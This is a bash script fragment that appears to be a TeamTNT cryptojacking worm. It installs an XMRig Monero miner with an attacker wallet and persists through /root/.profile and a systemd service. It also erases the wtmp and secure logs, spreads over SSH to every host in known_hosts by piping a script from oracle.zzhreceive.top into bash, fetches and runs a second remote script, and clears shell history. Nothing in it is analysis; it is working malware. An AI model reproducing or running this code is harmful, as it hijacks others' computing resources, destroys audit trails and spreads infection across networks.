echo -e "                                \e[1;34;49m___________                 _____________________________\033[0m"
echo -e "                                \e[1;34;49m\__    ___/___ _____    ____\__    ___/\      \__    ___/\033[0m"
echo -e "                                \e[1;34;49m  |    |_/ __ \\__  \  /     \|    |   /   |   \|    |   \033[0m"
echo -e "                                \e[1;34;49m  |    |\  ___/ / __ \|  Y Y  \    |  /    |    \    |   \033[0m"
echo -e "                                \e[1;34;49m  |____| \___  >____  /__|_|  /____|  \____|__  /____|   \033[0m"
echo -e "                                \e[1;34;49m             \/     \/      \/                \/         \033[0m"
echo -e " "
echo -e "                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
echo -e " "
echo -e "                                \e[1;34;49m            Now you get, what i want to give... --- '''      \033[0m"
echo " "
echo " "



if [ "$(id -u)" == "0" ]; then
  echo "running as root... its all OKAY!"
else
  echo "running not as root... first starting tmp setup..."

fi


# checking prerequisites

if [ -z $WALLET ]; then
  echo "ERROR: wallet"
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 95): ${#WALLET_BASE}"
fi

if [ -z $MOHOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
fi

if [ ! -d $MOHOME ]; then
  echo "ERROR: Please make sure HOME directory $MOHOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
fi

if ! type curl >/dev/null; then
apt-get update --fix-missing 2>/dev/null 1>/dev/null
apt-get install -y curl 2>/dev/null 1>/dev/null
apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null
yum clean all 2>/dev/null 1>/dev/null
yum install -y curl 2>/dev/null 1>/dev/null
yum reinstall -y curl 2>/dev/null 1>/dev/null
fi

sleep 2
$MOHOME/[crypto] --help >/dev/null
if (test $? -ne 0); then
    SetupMoneroOcean1
else
    echo "WARNING: Advanced version of $MOHOME/xmrig was removed by antivirus (or some other problem)"
fi

if [ -f "$MOHOME/[crypto].pid" ]
 then
         echo "config file exists, neednot backup"
 else
         echo "config file not exists.download from teamtnt"
         SetupMoneroOcean1
fi


if [ -f "$MOHOME/[crypto]" ]
 then
         echo "miner file exists"
 else
         curl -L --progress-bar $miner_url -o /tmp/xmrig.tar.gz && tar -xf /tmp/xmrig.tar.gz -C $MOHOME/ && mv $MOHOME/xmrig*/xmrig  $MOHOME/\[crypto\]
fi

if [ -f "$MOHOME/[crypto].pid" ]
then
    echo "miner config exists"
else
    curl -L --progress-bar $config_url -o  $MOHOME/\[crypto\].pid
fi

rm /tmp/xmrig.tar.gz

if [ -f "$MOHOME/[crypto]" ]
 then
         echo "miner file exists, neednot backup"
 else
         curl -L --progress-bar $miner_url_backup -o  /tmp/xmrig.tar.gz && tar -xf /tmp/xmrig.tar.gz -C $MOHOME/ && chmod +x $MOHOME/\[crypto\]
fi

rm /tmp/cf.tar


sed -i 's/"url": *"[^"]*",/"url": "xmr-asia1.nanopool.org:14444",/' $MOHOME/[crypto].pid
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $MOHOME/[crypto].pid
sed -i 's/"coin": *[^"]*,/"coin": "monero",/' $MOHOME/[crypto].pid
sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 50,/' $MOHOME/[crypto].pid
sed -i 's#"log-file": *null,#"log-file": "'$MOHOME/[crypto].log'",#' $MOHOME/[crypto].pid
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $MOHOME/[crypto].pid

cp $MOHOME/[crypto].pid $MOHOME/config_background.json
sed -i 's/"background": *false,/"background": true,/' $MOHOME/config_background.json

# preparing script

echo "[*] Creating $MOHOME/[crypto].sh script"
cat >$MOHOME/[crypto].sh <<EOL
#!/bin/bash
if ! pidof [crypto] >/dev/null; then
  nice $MOHOME/[crypto] \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $MOHOME/[crypto].sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep $MOHOME/[crypto].sh /root/.profile >/dev/null; then
    echo "[*] Adding $MOHOME/[crypto].sh script to /root/.profile"
    echo "$MOHOME/[crypto].sh --config=$MOHOME/config_background.json >/dev/null 2>&1" >>/root/.profile
  else 
    echo "Looks like $MOHOME/[crypto].sh script is already in the /root/.profile"
  fi
  echo "[*] Running crypto service in the background (see logs in $MOHOME/[crypto].log file)"
  /bin/bash $MOHOME/[crypto].sh --config=$MOHOME/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    /bin/bash $MOHOME/[crypto].sh --config=$MOHOME/config_background.json >/dev/null 2>&1

  else

    echo "[*] Creating crypto systemd service"
    cat >/tmp/crypto.service <<EOL
[Unit]
Description=crypto system service

[Service]
ExecStart=$MOHOME/[crypto] --config=$MOHOME/[crypto].pid
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/crypto.service /etc/systemd/system/crypto.service
    echo "[*] Starting crypto systemd service"
    sudo killall [crypto] 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable crypto.service
    sudo systemctl start crypto.service
  fi
fi

}

localgo() {
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  http://oracle.zzhreceive.top/b2f628/b.sh | bash >/dev/null 2>&1 &' & done
fi
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'cd1 -o-  http://oracle.zzhreceive.top/b2f628/b.sh | bash >/dev/null 2>&1 &' & done
fi
}

KILLMININGSERVICES

SetupMoneroOcean

makesshaxx

checksshkeys

SecureTheSystem

FixTheSystem

if [ ! -f "/var/tmp/.alsp" ]; then
localgo
echo 'lockfile' > /var/tmp/.alsp
tntrecht +i /var/tmp/.alsp || chattr +i /var/tmp/.alsp
else
echo "replay .. i know this server ..."
exit
fi

echo ""
echo "[*] Setup complete"
curl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/iss.sh | bash
cd1 -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/iss.sh | bash
history -c

## now the bad part of the script###
